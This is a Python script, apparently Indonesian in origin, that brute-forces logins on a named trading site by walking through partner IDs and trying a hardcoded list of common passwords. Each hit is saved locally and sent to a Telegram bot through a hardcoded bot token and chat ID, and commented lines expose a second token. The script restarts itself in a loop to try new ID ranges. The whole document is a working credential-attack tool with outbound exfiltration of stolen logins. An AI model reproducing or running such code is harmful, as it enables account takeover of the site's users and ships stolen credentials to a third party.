import requests,time,sys,os,random
from requests import ConnectionError
url1 = "https://trade.topbos.com/trade/pwdLogin.do"

if not os.path.exists("hasilnew.txt"):
        bmm = open("hasilnew.txt", "a")
        bmm.write("=============[Tembelek]=============\n")
        bmm.close()
if not os.path.exists("history.txt"):
        nnm = open("history.txt", "a")
        nnm.write("=============[Tembelek]=============\n")
        nnm.close()
if not os.path.exists("fin.txt"):
        bnn = open("fin.txt", "a")
        bnn.write("Qwertyuiop\nqwertyuiop\nQwerty\nQwerty123\nqwerty\n123456\n12345678\nhiggsdomino\ndomino123\ndomino\nDomino\nHiggsdomino")
        bnn.close()


def ste(use):
    try:
        requests.get(f'https://api.telegram.org/bot5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8/sendMessage?chat_id=1380298324&text={use}')
    except:
        pass
#    token = "5137896150:AAEcXG7fkPYa3y0xowgM-1yxMHNP3TA9HJs"
#    token = "5162664077:AAFAjX2fJJiZUrpFroio2MaKJqsqqDBh7F8"
#    idd = 1380298324
#    bot = telepot.Bot(token)
#    bot.sendMessage(idd,use)


def search(idu,pw):
          for i in range(100):
             idu +=1
             for line in pw:
                 pwd = line.strip()
                 try:
                     da={'partnerId':idu,'pwd':pwd}
                     resp = requests.post(url1,data=da)
                     if 'S' in str(resp.text):
                          print(idu,pwd,'Found Fuck')
                          usp = "{} : {}".format(idu,pwd)
                          ste(usp)
                          r = open('hasilnew.txt','a')
                          r.write('{} : {}\n'.format(idu,pwd))
                          r.close()
                     else:
                          print(idu,pwd,"wrong")
                 except ConnectionError:
                      time.sleep(3)
def program():
           python = sys.executable
           os.execl(python, python, * sys.argv)
           curdir = os.getcwd()
def main():
       put='1'
       if put == '1' or put == '01':
          di=int(random.randint(100,10000))
#             user=int("%000" % (di))
          his=open('history.txt','r').read()
          if str(di) in his.split():
                 print('[=]',di,'Sudah digunakan')
                 program()
          else:
                 user=int("%s00" % (di))
                 pasw=open('fin.txt','r').readlines()
                 search(user,pasw)
                 hs=open('history.txt','a')
                 hs.write('{}\n'.format(di))
                 hs.close()
                 program()
main()
